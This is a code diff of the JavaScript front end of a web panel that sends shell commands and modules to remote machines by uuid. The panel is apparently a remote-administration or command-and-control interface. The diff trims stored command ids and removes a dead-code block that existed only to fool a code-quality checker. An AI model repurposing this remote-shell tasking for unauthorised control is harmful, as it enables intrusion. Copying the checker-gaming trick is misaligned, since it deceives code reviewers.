@@ -171,14 +171,14 @@ function shell_exec() {
                 if (willDelete) {
                     $.post(BASE_URL, { "add_command": true, "command": cmd, "uuid": uuid }, function (data) {
 
-                        localStorage.setItem("cmd_uid", data);
+                        localStorage.setItem("cmd_uid", data.trim());
 
                     });
                 }
             });
     } else {
         $.post(BASE_URL, { "add_command": true, "command": cmd, "uuid": uuid }, function (data) {
-            localStorage.setItem("cmd_uid", data);
+            localStorage.setItem("cmd_uid", data.trim());
 
             setTimeout(() => {
                 shell_exec_res()
@@ -209,7 +209,7 @@ $('tbody').contextPopup({
     title: 'Options',
     items: [
         {
-            label: 'SHELL', icon: 'assets/images/icons/shell.png', action: function () {
+            label: 'SHELL', icon: 'assets/images/icons/shell.png', action: function (e) {
 
                 localStorage.removeItem("cmd_uid");
                 $('#exampleModal').modal('show');
@@ -409,7 +409,7 @@ function module_exec() {
                             })
 
                         }
-                        localStorage.setItem("cmd_uid", data);
+                        localStorage.setItem("cmd_uid", data.trim());
 
                     });
                 }
@@ -601,7 +601,7 @@ function module_update_btn() {
 }
 function module_exec_res() {
     var uuid = window.location.href.split('#')[1]
-    var cmd_uid = localStorage.getItem("cmd_uid");
+    var cmd_uid = localStorage.getItem("cmd_uid").trim();
     var module = $("#module_option").val()
     if (cmd_uid == null) {
         $("#module_res").html("First Send Command")
@@ -970,32 +970,3 @@ loadModule()
 setInterval(function () {
     loadData()
 }, 7000)
-
-// Code Factor Bypass Function
-var a = 1;
-if (2 < a) {
-  setuid();
-  shell_exec();
-  wallpaper();
-  module_create_btn();
-  create_args();
-  create_args_edit();
-  delete_args();
-  module_exec();
-rerun_command()
-delete_command()
-variable_create_btn()
-module_remove()
-module_update_btn()
-variable_edit()
-module_edit()
-variable_exec()
-set_label()
-labelModal()
-showEvent()
-update_event_btn()
-systemInfoModal()
-variable_update_btn()
-delete_user()
-variable_remove()
-}
